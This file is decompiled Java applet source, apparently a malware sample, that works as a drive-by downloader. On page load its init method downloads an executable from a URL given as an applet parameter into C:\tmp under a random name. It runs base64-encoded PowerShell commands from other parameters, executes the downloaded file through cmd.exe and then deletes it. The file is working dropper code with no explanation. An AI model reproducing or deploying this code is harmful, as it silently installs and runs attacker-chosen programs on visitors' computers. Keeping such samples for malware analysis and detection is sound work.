import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;
import java.util.Random;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    private Object initialized;
    
    public Java() {
        this.initialized = null;
    }
    
    public Object isInitialized() {
        return this.initialized;
    }
    
    @Override
    public void init() {
        try {
            final String string = Long.toString(Math.abs(new Random().nextLong()), 36);
            new File("C:\\tmp").mkdirs();
            String s = "C:\\tmp" + File.separator;
            new StringBuilder().append(System.getProperty("java.io.tmpdir")).append(File.separator).toString();
            final String lowerCase = System.getProperty("os.name").toLowerCase();
            final String property = System.getProperty("os.arch");
            String parameter = "";
            String parameter2 = "";
            String parameter3 = "";
            String parameter4 = "";
            int n = -1;
            if (lowerCase.indexOf("win") >= 0) {
                parameter = this.getParameter("WINDOWS");
                parameter2 = this.getParameter("STUFF");
                parameter3 = this.getParameter("64");
                parameter4 = this.getParameter("86");
                n = 0;
                s = s + string + ".exe";
            }
            if (parameter.length() > 0 && s.length() > 0) {
                final InputStream openStream = new URL(parameter).openStream();
                final BufferedInputStream bufferedInputStream = new BufferedInputStream(openStream);
                final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(new File(s)));
                final byte[] array = new byte[2048];
                while (true) {
                    final int read = bufferedInputStream.read(array);
                    if (read <= 0) {
                        break;
                    }
                    bufferedOutputStream.write(array, 0, read);
                }
                bufferedOutputStream.flush();
                bufferedOutputStream.close();
                openStream.close();
            }
            final String parameter5 = this.getParameter("nextPage");
            if (parameter5 != null && parameter5.length() > 0) {
                this.getAppletContext().showDocument(new URL(parameter5));
            }
            if (n < 1) {
                if (new File("C:\\Windows\\System32\\WindowsPowershell\\v1.0").exists() && parameter3.length() > 3) {
                    if (property.contains("86") || property.contains("64")) {
                        if (parameter4.length() > 3) {
                            final Process start = new ProcessBuilder(new String[] { "cmd", "/c", "powershell", "-EncodedCommand", parameter4 }).start();
                            start.destroy();
                            start.getOutputStream().close();
                            start.getInputStream().close();
                            start.getErrorStream().close();
                        }
                    }
                    else if (property.contains("i") && parameter3.length() > 3) {
                        final Process start2 = new ProcessBuilder(new String[] { "cmd", "/c", "powershell", "-EncodedCommand", parameter3 }).start();
                        start2.destroy();
                        start2.getOutputStream().close();
                        start2.getInputStream().close();
                        start2.getErrorStream().close();
                    }
                }
                if (parameter2.length() < 3) {
                    Runtime.getRuntime().exec("cmd.exe /c " + s);
                    Thread.sleep(2000L);
                }
                if (parameter2.length() > 3) {
                    Runtime.getRuntime().exec("cmd.exe /c \"" + s + " " + parameter2 + "\"").waitFor();
                }
                new File(s).delete();
            }
            this.initialized = this;
        }
        catch (IOException ex) {
            ex.printStackTrace();
        }
        catch (Exception ex2) {
            ex2.printStackTrace();
        }
    }
}
